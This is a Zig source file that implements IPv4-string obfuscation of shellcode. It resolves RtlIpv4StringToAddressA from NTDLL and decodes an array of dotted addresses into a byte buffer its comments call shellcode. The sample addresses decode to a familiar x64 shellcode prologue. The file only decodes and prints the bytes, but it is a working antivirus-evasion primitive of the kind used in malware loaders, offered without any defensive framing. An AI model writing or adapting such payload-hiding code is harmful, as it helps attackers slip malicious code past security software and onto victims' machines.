const std = @import("std");
const win = std.os.windows;
const kernel32 = win.kernel32;

const NTSTATUS = win.NTSTATUS;
const BOOLEAN = win.BOOLEAN;
const PCSTR = [*:0]const u8;
const PVOID = ?*anyopaque;
const PBYTE = [*]u8;
const SIZE_T = usize;

// Define function pointer type for RtlIpv4StringToAddressA
const fnRtlIpv4StringToAddressA = fn (
    S: PCSTR,
    Strict: BOOLEAN,
    Terminator: *PCSTR,
    Addr: PVOID,
) callconv(win.WINAPI) NTSTATUS;

/// Deobfuscates an array of IPv4 strings into a byte buffer
pub fn ipv4Deobfuscation(
    ipv4Array: []const [*:0]const u8,
    allocator: std.mem.Allocator,
) !struct { buffer: []u8, size: SIZE_T } {
    // Create a UTF-16 string for "NTDLL"
    const ntdll_w: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral("NTDLL");

    // Load the NTDLL library using wide string
    const ntdll_module = kernel32.GetModuleHandleW(ntdll_w);
    if (ntdll_module == null) {
        std.debug.print("[!] GetModuleHandle Failed With Error : {}\n", .{kernel32.GetLastError()});
        return error.GetModuleHandleFailed;
    }

    // Get the address of RtlIpv4StringToAddressA function
    const rtlIpv4StringToAddressA_ptr = kernel32.GetProcAddress(ntdll_module.?, "RtlIpv4StringToAddressA");
    if (rtlIpv4StringToAddressA_ptr == null) {
        std.debug.print("[!] GetProcAddress Failed With Error : {}\n", .{kernel32.GetLastError()});
        return error.GetProcAddressFailed;
    }

    // Cast the function pointer to the correct type
    const rtlIpv4StringToAddressA: *const fnRtlIpv4StringToAddressA = @ptrCast(rtlIpv4StringToAddressA_ptr);

    // Calculate the size of the buffer needed (number of IPv4 addresses * 4 bytes each)
    const bufferSize = ipv4Array.len * 4;

    // Allocate memory for the deobfuscated shellcode
    var buffer = try allocator.alloc(u8, bufferSize);
    errdefer allocator.free(buffer);

    // Deobfuscate each IPv4 address
    for (ipv4Array, 0..) |ipAddress, i| {
        var terminator: PCSTR = undefined;

        // Calculate the offset in the buffer for this IPv4 address
        const offset = i * 4;

        // Convert the IPv4 string to bytes
        const status = rtlIpv4StringToAddressA(ipAddress, win.FALSE, &terminator, &buffer[offset]);

        // Check if the status is not SUCCESS (0)
        // Use the proper status constant from the ntstatus module
        if (status != NTSTATUS.SUCCESS) {
            std.debug.print("[!] RtlIpv4StringToAddressA Failed At [{s}] With Error 0x{X:0>8}\n", .{ ipAddress, @intFromEnum(status) });
            return error.RtlIpv4StringToAddressFailed;
        }
    }

    return .{ .buffer = buffer, .size = bufferSize };
}

pub fn main() !void {
    // Setup allocator
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();
    const allocator = arena.allocator();

    // Example array of IPv4 addresses
    const ipv4_array = [_][*:0]const u8{ "252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81" };
    std.debug.print("[+] Attempting to deobfuscate {} IPv4 addresses\n", .{ipv4_array.len});

    // Call the deobfuscation function
    const result = try ipv4Deobfuscation(&ipv4_array, allocator);
    defer allocator.free(result.buffer);

    std.debug.print("[+] Successfully deobfuscated shellcode\n", .{});
    std.debug.print("[+] Buffer size: {} bytes\n", .{result.size});

    // Optionally print the bytes (first 16 bytes or fewer if smaller)
    const bytes_to_print = @min(result.size, 16);
    std.debug.print("[+] First {} bytes: ", .{bytes_to_print});
    for (result.buffer[0..bytes_to_print]) |byte| {
        std.debug.print("{X:0>2} ", .{byte});
    }
    std.debug.print("\n", .{});
}
